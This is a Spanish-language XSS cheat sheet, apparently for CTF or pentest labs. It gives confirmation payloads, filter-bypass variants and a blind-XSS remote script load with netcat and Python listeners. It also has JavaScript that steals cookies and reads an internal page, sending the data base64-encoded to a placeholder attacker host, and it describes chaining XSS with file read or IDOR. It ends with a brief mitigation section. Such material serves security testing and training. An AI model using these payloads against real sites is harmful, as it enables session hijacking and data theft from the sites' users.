# Cross-Site Scripting (XSS)

## Tipos

- **Reflejado:** la entrada vuelve en la respuesta inmediata.
- **Stored:** la entrada se guarda y se sirve a otros (comentarios, markdown, perfiles).
- **Blind:** se ejecuta en un contexto que no ves (panel de admin, soporte). Confirma con callback.
- **DOM:** el sink es JS en el cliente (`innerHTML`, `document.write`, `eval`).

## Payloads de confirmación

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

En **Markdown** (renderers que permiten HTML):

```html
<script>alert(1)</script>
<img src="x" onerror="alert(1)" />
```

## Blind XSS — confirmar ejecución

Carga un script remoto y escucha el callback:

```html
<script src="http://TU_IP:PORT/x.js"></script>
```

```bash
# Escucha el pull del script (confirma que ejecutó)
nc -lvnp PORT
# o servidor completo si vas a servir el .js
python3 -m http.server PORT
```

## Exfiltración de datos vía JS

Robo de cookies:

```javascript
new Image().src = "http://TU_IP:PORT/?c=" + document.cookie;
```

Leer una página interna (misma-origin) y exfiltrarla en base64:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://victima.htb/pagina-interna.php', false);
req.send();
var out = new XMLHttpRequest();
out.open('GET', 'http://TU_IP:PORT/?content=' + btoa(req.responseText), true);
out.send();
```

Decodifica lo recibido:

```bash
echo "BASE64_RECIBIDO" | base64 -d
```

> **Patrón de encadenado potente:** XSS en una víctima con sesión privilegiada →
> usar su navegador como proxy para leer páginas internas / endpoints que tú no
> puedes alcanzar → combinar con **file read** o **IDOR** para escalar.

## Bypass de filtros

- Mayúsc/minúsc mezcladas: `<ScRiPt>`
- Sin `<script>`: `onerror`, `onload`, `onfocus autofocus`
- Codificación: HTML entities, URL, Unicode, doble codificación
- Romper regex: `<img/src=x onerror=...>` (sin espacios)
- `javascript:` en `href`/`src`

## Mitigación

Output encoding según contexto (HTML/attr/JS/URL), CSP estricta,
`HttpOnly` + `SameSite` en cookies, sanitización allowlist (DOMPurify).
